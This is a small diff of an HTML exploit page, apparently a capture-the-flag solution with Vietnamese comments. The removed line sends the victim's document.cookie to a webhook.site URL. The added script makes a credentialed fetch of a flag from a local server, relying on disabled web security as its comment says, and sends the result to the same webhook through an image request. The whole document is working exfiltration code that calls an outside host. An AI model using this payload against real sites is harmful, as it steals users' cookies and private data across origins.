@@ -1,4 +1,10 @@
+<!doctype html>
 <script>
-  fetch('https://webhook.site/27dcd9d4-6a16-4962-a8ea-dee37c4a7c13?c=' + document.cookie);
+  // nhờ disable-web-security nên fetch CORS thoải mái
+  fetch("http://localhost:3000/get_flag", { credentials: "include" })
+    .then(r => r.json())
+    .then(j => {
+      // gửi flag về server của bạn
+      new Image().src = "https://webhook.site/27dcd9d4-6a16-4962-a8ea-dee37c4a7c13?c=" + encodeURIComponent(j.flag)
+    });
 </script>
-
